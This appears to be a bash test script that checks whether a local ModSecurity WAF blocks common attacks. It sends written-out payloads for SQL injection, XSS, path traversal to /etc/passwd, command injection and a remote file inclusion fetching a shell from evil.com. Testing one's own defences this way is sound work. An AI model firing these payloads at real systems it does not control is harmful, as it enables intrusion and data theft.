#!/bin/bash
# tests/waf_attacks.sh  
# Script de test d'attaques contre le WAF

echo "🛡️ Test des protections WAF ModSecurity"
echo "======================================="

WAF_URL="http://localhost"

# Fonction de test d'attaque
test_attack() {
    local attack_name=$1
    local attack_url=$2
    
    echo -n "Testing $attack_name... "
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "$attack_url")
    
    if [ "$response" -eq 403 ] || [ "$response" -eq 406 ]; then
        echo "✅ BLOCKED (HTTP $response)"
        return 0
    else
        echo "❌ NOT BLOCKED (HTTP $response)"
        return 1
    fi
}

# Tests d'attaques
echo "Testing SQL Injection attacks..."
test_attack "SQLi Basic" "$WAF_URL/?id=1' OR '1'='1"
test_attack "SQLi Union" "$WAF_URL/?id=1 UNION SELECT * FROM users"
test_attack "SQLi Comment" "$WAF_URL/?id=1';--"

echo ""
echo "Testing XSS attacks..."
test_attack "XSS Basic" "$WAF_URL/?search=<script>alert('xss')</script>"
test_attack "XSS IMG" "$WAF_URL/?img=<img src=x onerror=alert(1)>"
test_attack "XSS Event" "$WAF_URL/?input=<body onload=alert(1)>"

echo ""
echo "Testing Path Traversal..."
test_attack "Directory Traversal" "$WAF_URL/../../../../etc/passwd"
test_attack "Windows Traversal" "$WAF_URL/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

echo ""
echo "Testing Command Injection..."
test_attack "Command Injection" "$WAF_URL/?cmd=; ls -la"
test_attack "Command Pipe" "$WAF_URL/?exec=|cat /etc/passwd"

echo ""
echo "Testing File Inclusion..."
test_attack "LFI" "$WAF_URL/?file=../../../etc/passwd"
test_attack "RFI" "$WAF_URL/?include=http://evil.com/shell.txt"

echo ""
echo "🔍 Check logs in Kibana: http://localhost:5601"
echo "🔍 Check metrics in Grafana: http://localhost:3000"
